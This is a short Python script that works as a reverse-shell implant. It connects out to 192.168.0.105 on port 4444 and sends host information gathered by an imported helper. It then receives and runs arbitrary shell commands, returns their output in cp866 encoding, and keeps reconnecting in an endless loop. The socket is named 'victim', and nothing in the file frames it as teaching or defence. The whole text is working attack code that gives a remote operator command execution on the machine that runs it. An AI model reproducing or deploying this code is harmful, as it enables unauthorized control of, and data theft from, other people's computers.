import socket
import subprocess
import os
import time
from info import get_host_info

info = get_host_info()

while True:
    victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        victim.connect(('192.168.0.105', 4444))

        victim.send(info.encode())

        while True:
            command = victim.recv(4096).decode('cp866').strip()

            if not command or command.lower() == 'exit':
                break

            if command[:2] == 'cd':
                try:
                    os.chdir(command[2:].strip())
                    output = ' '
                except (FileNotFoundError, OSError) as err:
                    victim.send(str(err).encode('cp866'))
                    continue

            else:
                output = subprocess.getoutput(command, encoding='cp866')

            victim.send(output.encode('cp866'))

        victim.close()
        time.sleep(1)

    except ConnectionError as e:
        print(e)
        continue
